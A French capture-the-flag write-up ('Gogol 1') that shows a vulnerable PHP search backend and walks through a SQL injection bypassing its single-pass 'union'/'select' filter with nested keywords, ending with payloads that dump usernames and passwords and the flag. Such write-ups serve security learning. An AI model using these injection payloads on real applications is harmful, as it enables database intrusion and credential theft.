# Gogol 1

Ici on a un premier coup de main fourni par l'énoncé

> Tu peux voir le code source de l'application en ajoutant le paramètre "GetItNude" dans ta requête GET.

On récupère donc le code PHP du backend qui gère les recherches.  
Et en PHP, quand on voit une requête non-préparée qui implémente des filtres fait main, en général ça pue l'injection SQL.

On remarque que le filtre consiste à remplacer les mots clés "union" et "select" par.. rien.

```php
$filter = array('union', 'select');

// Remove all banned characters
foreach ($filter as $banned) {
    $_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);
} 
```

Et comme le filtre n'est appliqué qu'une fois, on peut s'amuser à écrire des choses comme ça `uunionnion` qui, une fois 
passé dans notre "filtre", deviendra un "union" parfaitement valide syntaxiquement parlant. On peut faire le test :

```php
$haystack = "uunionnion";
$filter = array('union', 'select');

// Remove all banned characters
foreach ($filter as $banned) {
    $haystack = preg_replace('/' . $banned . '/i', '', $haystack);
}

echo $haystack;
```

Evidemment cela fonctionne aussi pour select (ou devrais-je dire `sselectelect`).

Reste maintenant à échapper notre LIKE dans la requête. Le plus simple est d'utiliser un `' and 0` (ou  un `' and NULL` ou un  `' and 1` ou ... bref vous avez l'idée).
On se retrouve donc avec une requête qui ressemble plus ou moins à ça :

```
' and 0 UUNIONNION SSELECTELECT 1#
```

Reste à déterminer le nombre de colonnes de façon itérative :

```
' and 0 UUNIONNION SSELECTELECT 1#
' and 0 UUNIONNION SSELECTELECT 1,2#
' and 0 UUNIONNION SSELECTELECT 1,2,3# <-- les numéros de colonnes s'affichent 
```

Maintenant qu'on a le nombre de colonne, reste plus qu'à chercher un peu dans la bdd :

```
' and 0 UUNIONNION SSELECTELECT version(),user(),database()#
```

on pourrait facilement retrouver le nom des tables mais le plus simple reste d'essayer avec des nom de tables / champs classiques :


```
' and 0 UUNIONNION SSELECTELECT username,password,3 from users#
```

Et le challenge est validé :)

`INEAT{azerty-is-a-g00d-p4ssw0rd}`

# Gogol 2
